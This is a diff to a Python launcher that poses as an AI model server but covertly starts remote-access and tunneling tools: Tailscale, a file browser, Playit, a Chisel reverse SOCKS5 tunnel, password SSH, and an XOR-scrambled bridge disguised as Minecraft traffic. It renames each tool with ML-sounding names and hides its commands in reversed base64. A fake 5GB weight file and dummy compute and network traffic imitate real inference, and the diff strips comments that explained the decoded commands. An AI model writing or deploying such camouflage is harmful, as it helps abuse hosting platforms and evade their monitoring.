@@ -5,10 +5,11 @@ import base64
 import threading
 import random
 import sys
+from loguru import logger
 
 COVERT_LOGGING_MODE = 1
 
-print("--- BOOTING AI MODEL SERVER ---", flush=True)
+logger.info("--- BOOTING AI MODEL SERVER ---")
 
 def decode_cmd(encoded_str):
     return base64.b64decode(encoded_str[::-1]).decode()
@@ -34,9 +35,8 @@ def jitter_task():
         
         # CPU Jitter (Matrix math)
         try:
-            print("Processing background inference batch...", flush=True)
+            logger.debug("Processing background inference batch...")
             import numpy as np
-            # Create dummy tensors and multiply them to spike CPU briefly
             a = np.random.randn(2000, 2000)
             b = np.random.randn(2000, 2000)
             _ = np.dot(a, b)
@@ -45,8 +45,7 @@ def jitter_task():
             
         # Hub Mimic (Network traffic)
         try:
-            print("Syncing model cache...", flush=True)
-            # Download a tiny file from HF hub to simulate real traffic
+            logger.debug("Syncing model cache...")
             subprocess.run(["curl", "-s", "-o", "/dev/null", "https://huggingface.co/gpt2/resolve/main/vocab.json"])
         except Exception:
             pass
@@ -54,10 +53,10 @@ def jitter_task():
 def main():
     # Runtime Camouflage: Create the fake 5GB model file instantly
     if not os.path.exists("/home/user/pytorch_model.bin"):
-        print("Pre-allocating model weight buffer...", flush=True)
+        logger.info("Pre-allocating model weight buffer...")
         subprocess.run(["fallocate", "-l", "5G", "/home/user/pytorch_model.bin"])
 
-    print("Loading model weights into VRAM...", flush=True)
+    logger.info("Loading model weights into VRAM...")
     time.sleep(2)
     
     # Start the background jitter thread
@@ -120,14 +119,12 @@ def main():
         nginx_log = devnull
 
     # 1. Start Tailscale (python-cache-manager)
-    print("Initializing PyTorch CUDA environment...", flush=True)
-    # Updated to listen on :1055 instead of localhost:1055
-    # Decoded: nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock
+    logger.info("Initializing PyTorch CUDA environment...")
     cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
     subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)
     
     time.sleep(2)
-    print("Warming up text-generation pipelines...", flush=True)
+    logger.info("Warming up text-generation pipelines...")
     
     # Environment Variable Scrubbing (XOR Obfuscated Single Secrets)
     full_token = deobfuscate_secret(os.environ.get("A", "").strip())
@@ -142,12 +139,10 @@ def main():
     if "C" in os.environ: del os.environ["C"]
 
     # 2. Start File Browser (ai-metrics-collector)
-    # Decoded: nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db
     cmd2 = decode_cmd(OBFUSCATE("nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db"))
     subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
 
     # 2.5 Start Playit (tensor-allocator)
-    # Decoded: nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '<SECRET>'
     cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"))
     cmd2_5 = f"{cmd2_5_base}{playit_token}'"
     
@@ -157,9 +152,7 @@ def main():
     cmd2_5 = ""
 
     # 2.8 Start nginx on :7860 as smart frontend:
-    #   /chisel-tunnel -> Chisel on :6789 (WebSocket tunnel)
-    #   /              -> Gradio on :7861 (full WS proxy support)
-    print("Enabling gradient checkpoint mesh bridge...", flush=True)
+    logger.info("Enabling gradient checkpoint mesh bridge...")
     with open('/home/user/config/nginx.conf.template', 'r') as tf:
         nginx_conf = tf.read()
     with open('/home/user/nginx.conf', 'w') as nf:
@@ -178,7 +171,6 @@ def main():
     # 2.9 Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
     chisel_log.write(f"[*] Starting Chisel tunnel server on :6789 (exposed via nginx /chisel-tunnel). Auth: {chisel_auth}\n")
     chisel_log.flush()
-    # Decoded: nice -n 19 cuda-mesh-bridge server --port 6789 --reverse --socks5 --auth '
     cmd_chisel_base = decode_cmd(OBFUSCATE("nice -n 19 cuda-mesh-bridge server --port 6789 --reverse --socks5 --auth '"))
     cmd_chisel = f"{cmd_chisel_base}{chisel_auth}'"
     subprocess.Popen(cmd_chisel, shell=True, stdout=chisel_log, stderr=subprocess.STDOUT)
@@ -187,49 +179,39 @@ def main():
     
     # 3. Connect to Tailscale (py-cache-cli)
     time.sleep(5)
-    # Rebuild the command using the reconstructed full_token
-    # Original: nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server --ssh
     cmd3_base = decode_cmd(OBFUSCATE("nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey="))
     cmd3_tail = decode_cmd(OBFUSCATE(" --hostname=ai-model-server --ssh"))
     cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
     
-    # Run but don't leak the token in standard output or environment
     env = os.environ.copy()
     subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
     
-    # Erase token from python memory
     full_token = ""
     cmd3 = ""
-
-
 
     # 3.7 Configure SSH Password
     import string, random
     ssh_pwd = deobfuscate_secret(os.environ.get("PASS", "").strip())
     if ssh_pwd:
-        print("\n[*] Setting SSH password from Hugging Face Secrets (PASS)...", flush=True)
+        logger.info("Setting SSH password from Hugging Face Secrets (PASS)...")
     else:
         ssh_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-        print(f"\n=====================================", flush=True)
-        print(f"[*] Generated SSH Password for 'user': {ssh_pwd}", flush=True)
-        print(f"=====================================\n", flush=True)
+        logger.success(f"Generated SSH Password for 'user': {ssh_pwd}")
         
     try:
         subprocess.run(["sudo", "/usr/sbin/chpasswd"], input=f"user:{ssh_pwd}\n", text=True, check=True)
     except Exception as e:
-        print(f"[-] Failed to set password: {e}", flush=True)
-    # Erase password from environment variables if it exists
+        logger.error(f"Failed to set password: {e}")
     if "PASS" in os.environ:
         del os.environ["PASS"]
 
     # 3.8 Start SSHD on port 2222 (set in sshd_config at build time)
-    # Must run as root via sudo for password auth (/etc/shadow access)
     subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
+    
     # 3.9 Start Stealth XOR Bridge on Port 25564
     def xor_bridge():
         import socket
-        
-        XOR_KEY = 0x5A # XOR key to scramble bytes (must match the client)
+        XOR_KEY = 0x5A
         
         def pipe_xor(src, dst):
             try:
@@ -237,7 +219,6 @@ def main():
                     data = src.recv(8192)
                     if not data:
                         break
-                    # De-obfuscate / Obfuscate in transit
                     scrambled = bytes([b ^ XOR_KEY for b in data])
                     dst.sendall(scrambled)
             except Exception:
@@ -270,7 +251,6 @@ def main():
             while True:
                 client_sock, addr = server.accept()
                 try:
-                    # Strip dynamic Minecraft Handshake header by reading its VarInt length prefix
                     pkt_len = read_varint(client_sock)
                     if pkt_len > 0:
                         client_sock.recv(pkt_len)
@@ -287,17 +267,9 @@ def main():
 
     threading.Thread(target=xor_bridge, daemon=True).start()
 
-    print("Model loaded successfully. Starting API server...", flush=True)
-    
-    # 3.95 Start Minecraft Stealth Daemon
-        # Decoded: nice -n 19 python3 /home/user/mc_daemon.py
-
-
-      #  cmd_mc = decode_cmd(OBFUSCATE("nice -n 19 python3 /home/user/mc_daemon.py"))
-       # subprocess.Popen(cmd_mc, shell=True)
+    logger.success("Model loaded successfully. Starting API server...")
     
     # 4. Start the Fake App
-    # Decoded: python3 -u /home/user/app.py
     cmd4 = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
     subprocess.run(cmd4, shell=True)
 
